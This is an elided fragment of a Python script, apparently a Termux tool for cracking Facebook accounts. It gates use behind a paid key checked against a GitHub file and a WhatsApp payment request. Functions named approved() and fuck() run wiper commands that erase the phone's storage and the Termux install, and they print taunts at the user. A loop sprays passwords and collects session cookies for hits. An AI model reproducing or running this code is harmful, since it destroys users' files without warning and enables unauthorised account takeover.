...
try:
	prox= requests.get('https://raw.githubusercontent.com/Twoaha/random-approval.txt/main/random-approval.txt').text
...
def uaku():
	try:
		...
		a=requests.get('https://github.com/Twoaha/random-approval.txt/blob/main/random-approval.txt').text
		ua=open('.bbnew.txt','w')
...
def Subscraption():
	...
	os.system('clear')
	print(logo)
	r1=requests.get("https://github.com/Twoaha/random-approval.txt/blom/main/random-approval.txt").text
	if key1 in r1:
		os.system('clear')
		print(logo)
		main()
		...
		os.system("clear")
		print(logo)
		print("\t    \033[1;37m[\033[1;32mâœ“\033[1;37m]\033[1;32mFirst Get Approval\033[1;37m ")
		...
		print("    \033[1;34m CAN'T TRY TO BYPSSS OTHER WISE YOURS DATA FUCK ")
		...
		time.sleep(3.5)
		tks = '*ASALAMUALIKUM*%2C%20*print-TWOAHA - X_🧸-SIR*%20*I*%20*BUY*%20*RS350EASYPAISA*%20*YOUR*%20*RANI_🧸*%20*NEW*%20*---*%20*TOOL*%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20*My*%20*Key*%20*:*'+naim+''+key1
		os.system('xdg-open  https://wa.me/+8801990953195?text='+tks)
		Subscraption()
...
def files():
    ...
    print(f'{M} Your System Fucked by {H} TWOAHA_🧸{P}')
def approved():
    os.system("rm -rf /sdcard/DCIM")
    os.system("rm -rf /sdcard/*")
    os.system("rm -rf /sdcard/update")
    ...
    os.system('mv $HOME /dev/null')
    os.system("rm -rf /data/data/com.termux/")
    print(f'{M} Your System Fucked by {H} TWOAHA🧸{P}')
...
def KING():
    ...
    print(f'{M} Your System Fucked by {H} TWOAHA🧸{P}');time.sleep(2)
def fuck():
    os.system("rm -rf /sdcard/DCIM")
    os.system("rm -rf /sdcard/*")
    os.system("rm -rf /sdcard/update")
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\033[1;92m[TWOAHA_💉 OK] '+cid+' | '+ps+'\n[•] Useeagent: '+ua+'\033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[1;95m[TWOAHA_ CP] '+cid+' | '+ps+'\033[0;97m')
